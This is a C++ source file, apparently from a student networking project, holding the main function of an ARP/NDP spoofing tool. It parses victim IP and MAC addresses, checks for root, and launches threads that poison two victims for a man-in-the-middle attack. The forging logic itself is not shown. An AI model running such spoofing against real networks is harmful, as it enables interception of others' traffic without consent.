/*
 * pds-spoof.cpp
 *
 *  Created on: Apr 8, 2017
 *      Author: Jan Profant
 */

#include <getopt.h>
#include <cstring>
#include <iostream>
#include <string>

#include "errormsg.h"
#include "interface.h"
#include "spoofer.h"

/**
 * Global variable for memory cleaning.
 */
Spoofer *p_spoofer = NULL;

/*
 * @brief Function to handle CTRL+C for exiting.
 */
void signal_callback_handler(int signum)
{
	p_spoofer->Free();
	delete p_spoofer;
	exit(0);
}

/**
 * @brief Main function for pds-spoof.
 */
int main(int argc, char * argv[] ) {
	int c;
	std::string interface_name(""), protocol(""), v1ip(""), v1mac(""), v2ip(""), v2mac("");
	int time = 0;
	while ((c = getopt(argc, argv, "i:t:p:v:")) != -1) {
		switch (c) {
			case 'i':
				interface_name = optarg;
				break;
			case 't':
				time = atoi(optarg);
				break;
			case 'p':
				protocol = optarg;
				if (protocol != "arp" && protocol != "ndp") {
					print_help_spoof();
					print_msg_and_abort("Invalid protocol type!");
				}
				break;
			case 'v':
				for ( ;optind < argc && *argv[optind] != '-'; optind++) {
					if (strcmp(optarg, "ictim1ip") == 0)
						v1ip = argv[optind];
					if (strcmp(optarg, "ictim1mac") == 0)
						v1mac = argv[optind];
					if (strcmp(optarg, "ictim2ip") == 0)
						v2ip = argv[optind];
					if (strcmp(optarg, "ictim2mac") == 0)
						v2mac = argv[optind];
				}
				break;
		}
	}
		
	if (	interface_name.length() == 0 || protocol.length() == 0 || time <= 0 ||
			v1ip.length() == 0 || v1mac.length() == 0 || v2ip.length() == 0 || v2mac.length() == 0) {
		print_help_spoof();
		print_msg_and_abort("Invalid parameters!");
	}

	if (getuid() && geteuid())
		print_msg_and_abort("You must be root to run this.");


	p_spoofer = new Spoofer();
	p_spoofer->SetInterface(interface_name);
	p_spoofer->SetInterval(time);
	p_spoofer->SetProtocolType(protocol);
	if (!p_spoofer->SetVictim1IP(v1ip))
		print_msg_and_abort("Invalid IP address for victim1!");
	if (!p_spoofer->SetVictim2IP(v2ip))
		print_msg_and_abort("Invalid IP address for victim2!");
	if (!p_spoofer->SetVictim1MAC(v1mac))
		print_msg_and_abort("Invalid MAC address for victim1!");
	if (!p_spoofer->SetVictim2MAC(v2mac))
		print_msg_and_abort("Invalid MAC address for victim2!");

	signal(SIGINT, signal_callback_handler);

    pthread_t pt1, pt2;
	pthread_create(&pt1, NULL, &Spoofer::StartVictim1_helper, p_spoofer);
	pthread_create(&pt2, NULL, &Spoofer::StartVictim2_helper, p_spoofer);

	pthread_join(pt2, NULL);

	return 0;
}


